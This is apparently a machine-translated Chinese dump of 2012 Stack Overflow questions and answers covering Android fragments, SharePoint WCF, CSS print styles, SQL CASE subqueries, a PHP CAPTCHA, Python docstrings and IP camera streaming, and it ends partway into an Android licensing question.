虽然谷歌地图实际上可以支持室内地图和导航，但很可能不是您想要的。如果你想使用你自己的算法表单路由，你不能使用谷歌地图。

查看开源路由机 (OSRM)：[http](http://project-osrm.org/) ://project-osrm.org/ 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:35:14.760

[这是用于上传和制作室内地图的谷歌页面。](http://support.google.com/gmm/bin/answer.py?hl=en&answer=1685896&topic=1685871&ctx=topic)

# android - 使用 Swipe View 和 Tile Strip 的 Android 布局

> ID：11651939
> 
> 赞同：1
> 
> 时间：2012-07-25T14:22:02.237
> 
> 标签：android, fragment

我正在制作一个新应用程序，使用“Swipe View + Tile Strip”布局，但似乎无法弄清楚如何将不同的视图实际加载到 FragmentPagerAdapter 的片段中？

对此的任何帮助都会很棒（我对android开发还是很陌生，所以放轻松；））

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:42:04.607

创建一个扩展类`FragmentPagerAdapter`。

`getItem()`为每个位置覆盖并返回不同的片段。

尝试这样的事情：

```
public class MyCustomFPAdapter extends FragmentPagerAdapter{

    public MyCustomFPAdapter (FragmentManager fm) {
        super(fm);
    }

    @Override
    public Fragment getItem(int position) {
        if (position == 0) {
            return Fragment0.newInstance();
        } else if (position == 1) {
            return Fragment1.newInstance();
        } else if (position == 2) {
            return Fragment2.newInstance();
        } else if (position == 3) {
            return Fragment3.newInstance();
        } else {
            return DefaultFragment.newInstance();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:29:44.703

在 FragmentPagerAdapter 中，您不加载视图，而是加载片段。

阅读 FragmentPagerAdapter 的官方文档，其中也有一个不错的教程。这是了解这个 Pager 的第一步。

[http://developer.android.com/reference/android/support/v4/app/FragmentPagerAdapter.html](http://developer.android.com/reference/android/support/v4/app/FragmentPagerAdapter.html)

祝你好运！

# wcf - MultipleBaseAddressBasicHttpBindingServiceHostFactory 在 SP 2010 声明和 FBA 中使用 web.config

> ID：11651941
> 
> 赞同：2
> 
> 时间：2012-07-25T14:22:13.613
> 
> 标签：wcf, sharepoint, sharepoint-2010

提前致谢。我有一个 SP 2010 农场。它有两个前端 Web 应用程序，

*   WebApp1 (boxname = box1.domain.com) 使用默认的 windows 身份验证模式，
*   WebApp2 (boxname = box2.domain.com) 使用基于声明的身份验证，通过 LDAP 身份验证使用 FBA，

我开发了一个 WCF 服务应用程序，它有两个服务。其中一项服务使用 MultipleBaseAddressBasicHttpBindingServiceHostFactory 并在两个 Web 应用程序中运行良好。另一种是基于 web.config 的自定义服务，不能从 WebApp2 工作，甚至不能发布元数据。

我的问题是我不想使用 MultipleBaseAddressBasicHttpBindingServiceHostFactory 并且喜欢使用 web.config 文件做同样的事情。有可能吗？如果可能的话，任何人都可以帮我这样做吗？

需要考虑的几点 - - Wcf 文件是基本的“Hello World”类型应用程序， - 我正在使用 WCFTestClient 测试服务， - WebApp2 的 IIS 身份验证包括匿名、表单、Windows 已启用，其余已禁用，

再次感谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-10T14:58:11.923

You'd need to write code to programmatically add the base address since the actual address of your service will depend on site collection etc. There's no way to dynamically assign the address using the config file.

Having said that, you could deploy your service outside of SharePoint by changing the managed paths for your web application and then deploying directly to IIS. The drawback of course is that you won't have access to SPContext and the SharePoint security model.

# html - 打印时隐藏 HTML 媒体

> ID：11651943
> 
> 赞同：1
> 
> 时间：2012-07-25T14:22:19.180
> 
> 标签：html, css, printing-web-page

我目前正在使用 HTML 处理可打印的文档，该文档将显示从数据库中提取的数据。我的想法是我将使用 HTML/CSS 使文档看起来不错，但它将专门用于打印。

该文档使用表格进行布局，以控制数据库中数据的显示方式。

关键要求之一是文件只能覆盖 A4 的 2 面。但是，我们从数据库中获取的数据有些不可预测，因为字段大小非常大，所以我们不能保证数据库中的一行等于文档中的一行。

因此，我们希望使用一种解决方案，其中表的大小由 HTML 控制，并且数据库中导致表大于定义的任何输出都应该隐藏。

我已经定义了以下 CSS 样式

```
table.noQual
{
page-break-inside: avoid;
width: 100%;
border: 0px;
font-family:"Verdana","sans-serif";color:black;
overflow-y:hidden;
display:block;
max-height:50px !important;
} 
```

这在屏幕上工作得很好，但是当我打印时，所有的数据库内容都会显示出来，所以表格会变得大于 50px 并越过页面。

如何使打印机和屏幕隐藏的内容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-11T09:54:42.667

您是否`@media`在现有样式表中指定了打印样式表或打印部分？

默认情况下，样式表可以在屏幕上正常工作（如您所见）；但是，除非您明确指定打印 CSS 样式表，否则在打印页面时，它将默认为浏览器的默认样式（通常为 15pt Times New Roman 等）。

**解决方案 1：添加第二个打印样式表**
在 HTML 头中包含以下两个标签：

`<link rel="stylesheet" type="text/css" href="screenstyles.css" media="screen" />` `<link rel="stylesheet" type="text/css" href="printstyles.css" media="print" />`

`screenstyles.css`然后从to复制所需的格式样式`printstyles.css`（或者只是将两者`<link rel="" />`的链接都链接到您的屏幕样式表）。

**解决方案 2：只有 1 个样式表，但其中有打印您`@media`的**
单个 CSS 样式表会像这样（`media=""`从您的 css 链接 rel 标记中省略：

```
/*Normal css*/
table.noQual {
    page-break-inside: avoid;
    width: 100%;
    border: 0px;
    font-family: "Verdana","sans-serif";
    color:black;
    overflow-y: hidden;
    display: block;
    max-height:50px !important;
}
@media print {
    /*Everything inside here will be used to style the printed product*/
    table.noQual {
        page-break-inside: avoid;
        width: 100%;
        border: 0px;
        font-family: "Verdana","sans-serif";
        color:black;
        overflow-y: hidden;
        display: block;
        max-height: 50px !important;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:27:17.947

如果不知道实际数据是什么，或者它是什么格式，就很难提供解决方案。您可能需要放入一些 javascript 以在设定的字符数后截断文本。（有人告诉我有一些 [非标准] CSS 可以做同样的事情。）

否则，我认为您的问题源于您在桌子上使用像素高度。您可能想要使用`cm`或类似的单位来转换为“真实世界”的测量值。[以下是](http://www.w3.org/TR/CSS2/page.html)您可能需要考虑的有关印刷媒体样式的一些信息。

您可能还想研究使用[媒体类型](http://www.w3.org/TR/CSS2/media.html)来创建专门用于打印的自定义 CSS。

# sql - 如何在 mssql 2008 中的 case 语句中使用子查询

> ID：11651945
> 
> 赞同：0
> 
> 时间：2012-07-25T14:22:26.340
> 
> 标签：sql, sql-server, sql-server-2008, subquery, case

我需要使用带有子查询的 select case 语句将以下过程 if else 语句更改为单个查询...

```
 if((select COUNT(*) from pseb.dbo.meterattributedetails where meterid=@meterid)=0)
  select @emf=EMF from pseb.dbo.METERMASTER where MeterID=@meterid
  else  if((select COUNT(*) from pseb.dbo.meterattributedetails where meterid=@meterid and dateadd(day,1,@fromdate)<DateTime)>0) 
    select top 1 @emf=oldvalue from pseb.dbo.meterattributedetails  where MeterID=@meterid and dateadd(day,1,@fromdate)<datetime order by DateTime 
     else 
  select top 1 @emf=newvalue from pseb.dbo.meterattributedetails  where meterid=@meterid and DateTime<@fromdate order by DateTime desc 
```

米属性表结构如下：

```
AttributeID AttributeName   Oldvalue    newvalue    DateTime    meterid
1           EMF         2.00000         4.00000        2012-07-05   4756
1           EMF         4.00000         6.00000        2012-07-10   4756
1           EMF         6.00000         8.00000        2012-07-15   4756
1           EMF         8.00000        10.00000        2012-07-25   4756 
```

在该表中 datetime 指的是 emf 更改日期，如果我的输入是“2012-07-17”，则意味着我必须获取该特定日期的新值，在 7 月 15 日至 25 日之间，emf 值为 8.00000。

* * *

[我使用http://www.dpriver.com/pp/sqlformat.htm](http://www.dpriver.com/pp/sqlformat.htm)格式化了您的代码——迈克尔

```
IF( (SELECT Count(*) 
     FROM   pseb.dbo.meterattributedetails 
     WHERE  meterid = @meterid) = 0 ) 
  SELECT @emf = emf 
  FROM   pseb.dbo.metermaster 
  WHERE  meterid = @meterid 
ELSE IF( (SELECT Count(*) 
     FROM   pseb.dbo.meterattributedetails 
     WHERE  meterid = @meterid 
            AND Dateadd(day, 1, @fromdate) < datetime) > 0 ) 
  SELECT TOP 1 @emf = oldvalue 
  FROM   pseb.dbo.meterattributedetails 
  WHERE  meterid = @meterid 
         AND Dateadd(day, 1, @fromdate) < datetime 
  ORDER  BY datetime 
ELSE 
  SELECT TOP 1 @emf = newvalue 
  FROM   pseb.dbo.meterattributedetails 
  WHERE  meterid = @meterid 
         AND datetime < @fromdate 
  ORDER  BY datetime DESC 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-25T15:04:36.777

@Michael - 感谢您提供指向[http://www.dpriver.com/pp/sqlformat.htm](http://www.dpriver.com/pp/sqlformat.htm)的链接。

试试这个（当然未经测试）

```
SELECT @emf = CASE 
            WHEN ( (SELECT Count(*) 
                    FROM   pseb.dbo.meterattributedetails 
                    WHERE  meterid = @meterid) = 0 ) THEN 
            (SELECT emf 
             FROM   pseb.dbo.metermaster 
             WHERE  meterid = @meterid) 
            WHEN ( (SELECT Count(*) 
                    FROM   pseb.dbo.meterattributedetails 
                    WHERE  meterid = @meterid 
                           AND Dateadd(day, 1, @fromdate) < datetime) > 0 ) 
          THEN ( 
            SELECT 
            TOP 1 oldvalue 
            FROM 
          pseb.dbo.meterattributedetails 
            WHERE 
          meterid = @meterid 
          AND Dateadd(day, 1, @fromdate) < datetime 
            ORDER 
          BY datetime) 
            ELSE (SELECT TOP 1 newvalue 
                  FROM   pseb.dbo.meterattributedetails 
                  WHERE  meterid = @meterid 
                         AND datetime < @fromdate 
                  ORDER  BY datetime DESC) 
          END 
```

@Saranya：如果这不起作用，如何在[http://sqlfiddle.com/上设置一个测试用例](http://sqlfiddle.com/)

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T15:05:10.550

没有尝试进行语法检查，我认为您正在寻找这样的东西：

```
select @emf = case
  when not exists ( select 42 from pseb.dbo.meterattributedetails where meterid = @meterid )
    then ( select emf from pseb.dbo.metermaster where meterid = @meterid )
  when exists ( select 42 from pseb.dbo.meterattributedetails where meterid = @meterid and
    Dateadd(day, 1, @fromdate) < datetime )
    then ( select top 1 oldvalue from pseb.dbo.meterattributedetails where meterid = @meterid and
      Dateadd(day, 1, @fromdate) < datetime order by datetime )
  else ( select 1 newvalue from pseb.dbo.meterattributedetails where meterid = @meterid and
    datetime < @fromdate order by datetime desc )
  end 
```

**编辑**：一般来说，如果您要获得一个计数来检查零，您可以用`EXISTS`性能更好的合适的替换它。

# ios - UIImage 未显示在表格视图中

> ID：11651947
> 
> 赞同：1
> 
> 时间：2012-07-25T14:22:32.287
> 
> 标签：ios, xcode, uitableview, uiimage

我正在尝试在每一行中显示图像。我有一个开关来决定哪张图片在哪里。我没有显示任何图片。有人遇到同样的问题吗？

这是代码：

```
 self.statIcon = (UIImage *)[cell viewWithTag:42];

    NSString *statusPath;
    switch ([[[self.logList objectAtIndex:position] objectForKey:@"STATE"] intValue]) {
        case 1:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_acc" ofType:@"png"];
            break;
        case 2:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_dec" ofType:@"png"];
            break;
        case 3:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_rights" ofType:@"png"];
            break;
        default:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_rights" ofType:@"png"];
            break;
    }
    UIImage *statImg = [[UIImage alloc] initWithContentsOfFile:statusPath];
    self.statIcon = statImg; 
```

从调试器：

```
(NSString *) $1 = 0x001218b0 /var/mobile/Applications/167CC386-A0EE-4E05-BADD-B0307A01D684/My App.app/log_acc.png

(UIImage *) $0 = 0x00132e20 <UIImage: 0x132e20> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T06:55:39.393

好的，感谢[David H](https://stackoverflow.com/users/96716/david-h)，我能够找到解决问题的方法。主要问题是，`self.statIcon`那`UIImage`不是`UIImageView`. 所以只需要改变类型并最终使用功能`setImage`！

这是代码：

```
 self.statIcon = (UIImageView *)[cell viewWithTag:42];
    NSString *statusPath;
    switch ([[[self.logList objectAtIndex:position] objectForKey:@"STATE"] intValue]) {
        case 1:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_acc" ofType:@"png"];
            break;
        case 2:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_dec" ofType:@"png"];
            break;
        case 3:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_rights" ofType:@"png"];
            break;
        default:
            statusPath = [[NSBundle mainBundle] pathForResource:@"log_rights" ofType:@"png"];
            break;
    }
    UIImage *statImg = [UIImage imageWithContentsOfFile:statusPath];
    [self.statIcon setImage:statImg]; 
```

# javascript - 使用 JavaScript 将数组数组与类似的数组数组合并

> ID：11651952
> 
> 赞同：-6
> 
> 时间：2012-07-25T14:22:34.487
> 
> 标签：javascript, arrays, analytics

我正在尝试合并来自两个不同提供商的两组分析数据。数组、国家名称和指标排列如下：

```
[['Albania','1000'],['Australia','1000']] 
```

两个数据集都可以包含相同国家名称的不同版本（例如 UK 而不是 United Kingdom）。如何在 Javascript 中合并这些数组？合并是指将每个国家/地区的数据集组合成一组数组。

例子：

```
[['Albania','1000'],['United Kingdom','1000']]

+

[['Albania','1000'],['UK','1000']]

=

[['Albania','2000'],['United Kingdom','2000']] 
```

**澄清：**我们的移动网站使用一个分析提供商，而我们的主要全球网站使用另一个不同的分析提供商。我们需要合并这些数据集以创建准确的报告。只需要合并 2 个数据集。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:32:20.960

一种解决方案是创建一个数组，将一个国家的所有可能名称映射到一个值。

然后您可以使用 array_merge() 并解析值，将它们放在结果数组中。

例如：

```
<?php
$countryMap = array(
    'United Kingdom'           => 'uk',
    'UK'                       => 'uk',
    'Albania'                  => 'alb'
);

$array1 = array(array('Albania', 1000), array('United Kingdom', 1000));
$array2 = array(array('Albania', 1000), array('UK', 1000));

$mergedArray = array_merge($array1, $array2);

$finalArray = array();

foreach ($mergedArray as $a) {
    if (isset($finalArray[$countryMap[$a[0]]]))
        $finalArray[$countryMap[$a[0]]] += $a[1];
    else
        $finalArray[$countryMap[$a[0]]] = $a[1];
}

var_dump($finalArray); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:37:57.950

您需要提供第三个数组来定义给定国家/地区的所有别名。也许是这样的：

```
// the preferred alias is the first element of each set
var countryAliases = [
    [ 'United Kingdom', 'UK' ],
    [ 'United States', 'US'],
    // ...
]; 
```

只需遍历每个数据数组，在别名映射中找到每个项目的国家，然后将结果写入单个结果数组，使用首选别名作为键。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T15:15:47.743

这是从 PHP 帖子翻译的部分解决方案。这不会让您产生别名。由于关联数组，PHP 中的等效代码看起来更简洁。如果您使用对象文字而不是数组，您可以获得一个非常好的解决方案。此解决方案可能需要垫片，[`Array.indexOf`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/indexOf)并且可能[`Array.concat`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/concat)取决于您的平台。

[http://jsfiddle.net/radu/8JQBS/](http://jsfiddle.net/radu/8JQBS/)

```
var arr1 = [['Albania','1000'],['United Kingdom','1000']],
    arr2 = [['Albania','1000'],['UK','1000']],
    sum = [],
    index = -1;

var mergedArray = arr1.concat(arr2);

for (var i = 0, n = mergedArray.length; i !== n; i++) {

    for (var j = 0, m = sum.length; j !== m; j++) {   
        if (sum[j].indexOf(mergedArray[i][0]) !== -1) {
            index = j;
            break;            
        } else {
            index = -1;
        }
    }

    if (index !== -1) {
        sum[index][1] = (
            parseInt(sum[index][1], 10) +  
            parseInt(mergedArray[i][1], 10)
        ).toString();
    } else {
        sum.push([mergedArray[i][0], mergedArray[i][1]]);
    }
} 
```

这会产生：`[['Albania', '2000'], ['United Kingdom', '1000'], ['UK', '1000']]`. 您可以为此实现别名，但这很烦人 - 请参阅下文以获得更好的解决方案。

这是另一种解决方案，它不是生成一个数组数组，而是给出一个对象字面量。在我看来，这要好得多。您可能无法控制从您使用的任何 API 获得的数据，但您可以控制如何处理它，这应该会使下游代码更好。这可能需要一个垫片用于[`Object.hasOwnProperty`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/HasOwnProperty).

[http://jsfiddle.net/radu/fPsdc/](http://jsfiddle.net/radu/fPsdc/)

```
var arr1 = [['Albania','1000'],['United Kingdom','1000']],
    arr2 = [['Albania','1000'],['UK','1000']], 
    mergedArray = arr1.concat(arr2),
    sum = {},

    // property is preferred name
    // define aliases in lowercase
    aliases = {
        'uk' : 'United Kingdom'
    };

for (var i = 0, n = mergedArray.length; i !== n; i++) {
    var country = mergedArray[i][0],
        num = parseInt(mergedArray[i][1], 10);

    if (aliases.hasOwnProperty(country.toLowerCase())) {
        country = aliases[country.toLowerCase()];          
    }

    if (sum.hasOwnProperty(country))
        sum[country] += num;        
    else
        sum[country] = num;
} 
```

这会产生：`{'Albania' : 2000, 'United Kingdom' : 2000}`. 如果你*真的*必须有一个数组数组作为结果..你可以这样做：

```
var arrSum = [];

for (var prop in sum) {
    if (sum.hasOwnProperty(prop)) {
        arrSum.push([prop, sum[prop]]);
    }        
} 
```

# php - 使用 PHP 的 CAPTCHA 检查结果不正确

> ID：11651956
> 
> 赞同：0
> 
> 时间：2012-07-25T14:23:14.763
> 
> 标签：php, jquery

我将在我的表单中有一个验证码，如果验证码输入正确，则提交。我正在使用 jQuery AJAX 发送输入的代码以进行匹配检查。但是无论输入的验证码是否正确，我在 jQuery 中得到的结果都是一样的。

如何解决此问题并在 CAPTCHA 检查中获得正确结果？

这是我的代码，包括 PHP 和 jQuery：

PHP（生成图像.php）：

```
header('Content-type:image/jpeg');
$text = rand(100000, 999999);

...

if (isset($_POST['check_capcha'])) {
  $check =$_POST['check_capcha'];
  if ($check == $text) {
    echo true;
  }
} 
```

jQuery：

```
var check_capcha = $("#human_check_sub").val();
check_capcha = parseInt(check_capcha);
$.post("../php/generateimage.php", {check_capcha:check_capcha}, function(data) {
  if (data) {
    //$.post("../php/core.php");
    alert("ok sub");
  } else {
    $("#img_cap_sub").attr("src", "../php/generateimage.php");
    $("#caution_sub").html('<span>Capcha entered incorrect.try again</span>');
  }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:27:02.780

您可能必须在 $.post 调用中将第一个 check_captcha 放在引号中：

```
 $.post("../php/generateimage.php",{"check_capcha":check_capcha},function(data){ 
```

如果您考虑一下，JS 将使用 check_captcha 的值作为键和值，因此您的 php 页面可能无法识别它。

编辑：抱歉没有看到上面 Marc B 的评论，我必须同意他的观点，你应该生成一个值，将它保存在跨请求（会话）的持久位置，然后引用该数字，否则将生成两个随机数并且应该'不匹配（如果他们匹配那将是非常糟糕的）

*   肯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:32:02.373

看起来您为每个 ajax 请求生成了一个新的验证码，包括在验证尝试时。当您进行验证检查而不是生成新图像时，请跳过 rand 调用。生成它时，将正确的值存储在会话变量中，或者在您传递`check_capcha`带有尝试答案的参数时要检查的东西。

目前，您的 if 语句几乎肯定会返回 false

就像是

```
 session_start();

    if(!isset($_REQUEST['check_capcha']))
    {
        $_SESSION['correct'] = rand(100000, 999999);
        ...
        ...
        ...
    }
    else
    {
        if($check == $_SESSION['correct'])
        {
            echo true ;
        }
    } 
```

# python - 从 Python 包 __init__ 获取文档字符串 - 基于导入

> ID：11651960
> 
> 赞同：2
> 
> 时间：2012-07-25T14:23:25.693
> 
> 标签：python

我在 Python 包中有几个模块：

```
# my_package contents
__init__.py
module1.py
module2.py 
```

在我的`__init__.py`中，我正在导入这些模块，以便在我的用户导入包后可以访问它们。

```
# __init__.py
import module1
import module2 
```

我的问题是：我如何以编程方式访问每个模块中我定义的每个函数的文档字符串？我见过[其他人](https://stackoverflow.com/a/1270639/655787)使用这种形式：

```
getattr(module, key). __doc__ 
```

但我无法让它为我工作。有任何想法吗？

编辑：更多背景知识......我们正在尝试从我们的 python 包中提取内容（重要的事情之一是文档字符串），目的是将其用作文档的内容。我的老板已经设置了一些我们正在尝试使用的东西。

理想情况下，我想要一个`package.module.function docstring`结果

EDIT2：这是目前**不起作用**的：

```
#my package is named 'tpp'
import tpp

for script in dir(tpp):
    if not "__" in script: #not a builtin...
        docstrings1 = getattr( tpp, script).__doc__
        docstrings2 = " ".join(docstrings1.split())#clean out any newline chars
        print script, docstrings 
```

EDIT3：要了解文档字符串的位置以及我们如何组织事物：

```
import inspect
import tpp

inspect.getdoc(tpp)
#returns None

inspect.getdoc(tpp.module1)
#returns None

inspect.getdoc(tpp.module1.function1)
#'DOCSTRING TEXT FOUND!' 
```

**最终，我想得到一个类似 ['module1', 'function1', 'DOCSTRING TEXT FOUND!'] 的列表

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:41:24.607

使用[inspect.getdoc(object)](http://docs.python.org/library/inspect.html#inspect.getdoc)获取对象的文档字符串。使用[inspect.isfunction](http://docs.python.org/library/inspect.html#inspect.isfunction)检查一个对象是否是一个函数。

```
import inspect
for variable in vars(module).values():
    if inspect.isfunction(variable):
        print(inspect.getdoc(variable)) 
```

请注意，当对象没有文档字符串时，inspect.getdoc 返回 None，因此如果函数没有文档字符串，代码将打印 None。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:56:24.443

也许你想要这样的东西：

```
for script in dir(tpp):
    if not "__" in script: #not a builtin...
        docstrings1 = getattr( tpp, script).__doc__
        if docstrings1:  #objects without docstrings return None above, which can't be split.
            docstrings2 = " ".join(docstrings1.split())#clean out any newline chars
            print script, docstrings2 
```

但我不保证这会得到所有的文档字符串。您可能需要递归地进入您使用 getattr 检索的项目。

这是一个递归版本（可能会比您想要的更多）并且会因循环依赖而窒息：

```
def get_all_doc(obj,indent=''):
    for item in filter(lambda x:not x.startswith('__'),dir(obj)):
        o=getattr(obj,item)
        print "{indent}{item} {doc}".format(indent=indent,
                                            item=item,
                                            doc=o.__doc__)
        get_all_doc(o,indent=indent+'   ') 
```

# asp.net - 在不使用 Flash 的情况下在 ASP.NET 中显示来自 IP 摄像机的视频流

> ID：11651961
> 
> 赞同：2
> 
> 时间：2012-07-25T14:23:25.767
> 
> 标签：asp.net, video-streaming

我一直在寻找解决方案多年，但没有运气。我正在寻找的解决方案是从 IP 摄像机获取视频流。如果我可以在后端代码中立即获取视频帧（图像）会更好，因为该项目的下一阶段可能涉及一些图像处理。

作为我项目要求的一部分，我不想使用 Flash Player 来完成它。如果你能找到一种方法，我很高兴。

我已经尝试过 Microsoft 媒体平台 ( [smf.codeplex.com](http://smf.codeplex.com/) )，虽然这是一个非常好的方法，但不幸的是，这个框架似乎并不完美，它抱怨说

***“XML 命名空间‘clr-namespace:Microsoft.SilverlightMediaFramework.Core;assembly=Microsoft.SilverlightMediaFramework.Core’中不存在标签‘SMFPlayer’。”***

在我输入“Core”后，我确实检查了这一点。会`SMFPlayer`自动弹出，但还是提示找不到。

我也尝试了 Silver Light，但它无法访问 IP 摄像机。

现在，在我看来，没有办法做到这一点。如果有人能告诉我这一点，我将不胜感激。

提前致谢。

PS：谁能给我一些现场摄像头的IP地址？我也一直在搜索它们，但没有找到任何一个。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T15:00:45.597

我在一家警报监控公司工作，所以我整天都在做这个。

第一个选项；大多数 IP 摄像机允许您通过简单地向 HTTP 或 RTSP 端口发送格式正确的请求来从摄像机请求静止图像。该请求的确切性质因相机而异，并且取决于相机的配置。您可以使用 AJAX 根据超时发出此请求并将生成的图像放在页面上，并且您可以在服务器端进行实际的检索调用以获取图像并在发送图像之前进行图像处理。但是，如果您走这条路，您的 FPS 将会受到影响。

下一个选项是 HTML5；新的`<video>`所有主要浏览器都支持标签（尽管只有 IE、Chrome 和 Safari 支持将它用于 MPEG）。您可以使用此标记，指向 IP 摄像机的 H.264 或 MPEG 流的查询字符串请求。这将为您提供尽可能多的可用帧（或通过网络管道发送的尽可能多的帧；这是大多数消费者 Internet 所关心的问题，而不是 LAN 所关心的）。支持此标签的浏览器将具有内置的视频播放器，并且不需要使用插件。服务器不再参与传输相机数据；服务器将浏览器指向摄像头，这意味着首先，如果您希望从任何支持 Internet 的设备访问摄像头，则该摄像头必须是公开可用的；其次，您的服务器将不会接收任何摄像头流，除非它要求他们独立，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T02:43:57.633

我终于发现我使用了错误版本的 IIS Video Smooth Streaming dll。现在我决定采用这个解决方案。

谢谢大家的时间和想法:)

# apache - Aptana Studio Apache Tomcat 支持

> ID：11651962
> 
> 赞同：1
> 
> 时间：2012-07-25T14:23:30.537
> 
> 标签：apache, tomcat, aptana3

对 IDE 感到非常沮丧，当您使用 '.' 进行方法调用时，我只需要带有建议支持的基本 js 编辑器。+“空间”。因此，如果我添加 jQuery，我可以查看可用的方法。安装了 aptana studio，但它根本没有预装服务器。我不能称它为专业产品，因为这是无能。最重要的是添加服务器是痔疮程序，不像我们在 STS 或 Eclipse 中那样做。

我正在寻找有关如何在 aptana studio 上注册 apache tomcat 服务器的简单教程。我不想编写启动/停止命令或知道“文档根”行话的含义。我不想安装名为“wamp”的附加服务器只是为了将它与 aptana studio 一起使用。而且我不想将 aptana studio 作为插件安装，因为它破坏了 STS 中所有其他文件的字体和背景颜色，并且经常崩溃。

**如果这很容易做到并且我只是头脑发热，那么请接受我的道歉并为我提供指导，但如果它是第五名的痛苦，我宁愿遵循你的建议，使用其他非常好的 JavaScript 编辑器/IDE。**

开源缺乏标准真的变成了我可以称之为特定的不可迁移的知识，根本没有任何价值，所以我显然无意学习 AS 的复杂内脏。

谢谢你，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-11-19T01:12:04.637

将 su "tomcatuser" pwd:"tomcatuserpassword" 添加到服务器启动命令，在其他操作系统上的 linux startup.bat 上添加 startup.sh。使用 aptana 中 show view -> server 选项下的 edit server 选项执行此操作。

# php - 仅使用一个 index.php 文件检测移动设备并根据屏幕高度进行重定向

> ID：11651963
> 
> 赞同：1
> 
> 时间：2012-07-25T14:23:47.140
> 
> 标签：php, javascript, mobile

在通过解析 USER_AGENT 字符串检测我的网站是否在移动设备上使用后，我想将用户重定向到针对高度 >= 1024 的分辨率优化的页面（例如 9.7"、10.1" 平板电脑）或重定向用户访问针对分辨率 < 1024 进行优化的页面（例如智能手机和 5"、7"、8" 平板电脑）

为了实现这一点，我需要使用 javascript 获取屏幕分辨率。

我们知道 PHP（USER_AGENT 解析器脚本）在 javascript 之前执行，但我需要在解析器之前获取屏幕分辨率。据我所知，Web 服务器首先执行 INDEX.HTML，然后执行 INDEX.PHP，我编写了一个 Index.html 文件，该文件获取屏幕宽度并通过带有 POST 的表单（以保持地址栏清洁而不是 $_GET）传递给然后加载（包括）正确网页的 Index.php。

索引.HTML

```
<body onload="document.form.submit();">
    <form name="form" action="index.php" method="POST">
         <input type="hidden" id="height" name="height" value="" />
    </form>
    <script type="text/javascript">
         document.getElementById('height').value = screen.height;
    </script>
</body> 
```

索引.PHP

```
<?php
     $useragent=$_SERVER['HTTP_USER_AGENT'];
     // If it's a mobile device...
    if(preg_match(...) {
        // If the device screen height is => 1024 it's a tablet 8", 9.7" or 10.1"
        if ($_POST['height'] >= 1024) {
            include ('include.tablet.php');
        }
        // If the device screen height is < 1024 it's a smartphone or a tablet 5" o 7")...
        else {
            include ('include.smartphone.php');
        }
    }
    // If it's a desktop PC...
    else {
            include ('include.index.php');
        }
    }
?> 
```

现在我正在尝试在没有 HTML 文件的情况下做同样的事情。我编写了一个 index.php 文件，它获取 screen.width 并使用 $_SERVER['PHP_SELF'] 将其发送给自身，以便 PHP 代码可以将用户重定向到正确的页面。

```
<body onload="document.form.submit();">
    <form name="form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
        <input type="hidden" id="height" name="height" value="" />
    </form>
    <script type="text/javascript">
        document.getElementById('height').value = screen.height;
    </script>
    <?php if(isset($_POST['height'])) {
                // conditional include
    } ?>
</body> 
```

问题是该方法有效，但浏览器 (Firefox) 需要 1 或 2 秒来运行页面并返回结果。为什么？

**没有 JAVASCRIPT，没有 JQUERY：** 我知道我可以使用 javascript 解析器，然后重定向到正确的页面：'window.location.href' 但**我希望我的主页始终是 'index.php'**而不是以索引开头。 php 重定向到*tablet.php*或*smartphone.php*。我试图保持代码优雅。

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:30:27.487

检查变量，以免再次加载 JS：

```
<body>
    <form name="form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
        <input type="hidden" id="height" name="height" value="" />
    </form>
    <?php if(isset($_POST['height'])) { 
        echo $_POST['height']; 
     } else { 
    ?>
        <script type="text/javascript">
        document.getElementById('height').value = screen.height;
        document.form.submit();
       </script>
    <?php
     }
    ?>
</body> 
```

* * *

替代品：

您可以尝试在您的文件中像这样使用 javascript 和 jQuery 吗？

```
<!-- include jQuery -->
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script&gt;

<!-- execute it when the document is ready -->
<script type="text/javascript">
$(document).ready(function(){
     if($(window).height() > 1024){
             window.location = "http://pc.yoursite.com";
     }
});
</script> 
```

* * *

非 jQuery 选项（大多数使用宽度，有时取决于设备方向）：

```
<script type="text/javascript">
if (screen.width < 1024 || navigator.userAgent.toLowerCase().indexOf('android')!=-1)
(window.location.replace("http://www.yoursite.com"));
</script> 
```

* * *

另一种选择是在您的 CSS 中使用元视口标签和 @media 查询，但不会有您正在寻找的重定向。

# android - Android LVL 在测试时总是响应“许可”

> ID：11651966
> 
> 赞同：0
> 
> 时间：2012-07-25T14:23:57.837
> 
